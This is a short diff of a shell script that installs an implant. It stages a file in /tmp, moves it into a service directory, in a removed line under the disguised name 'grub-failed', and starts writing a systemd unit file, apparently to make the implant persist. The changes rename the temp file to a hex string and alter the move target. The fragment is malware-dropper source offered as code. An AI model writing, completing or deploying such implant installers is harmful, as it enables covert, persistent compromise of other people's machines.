@@ -42,7 +42,7 @@ get_home() {
 USER=$(id -un)
 HOME=$(get_home "$USER")
 url="<URL_IMPLANT>"
-out="/tmp/<IMPLANT>"
+out="/tmp/c8d11180c956e5b5afc3d1970ce2193e"
 
 echo "[v]-----| HOME:     $HOME"
 echo "[v]-----| USER:     $USER"
@@ -100,7 +100,7 @@ EOF
         echo "[v]-----| implant: $implant"
 
         mkdir -p "$service_dir"
-        mv "$out" "$service_dir/grub-failed"
+        mv "$out" "$implant"
 
         cat > "$service_file" <<EOF
 [Unit]
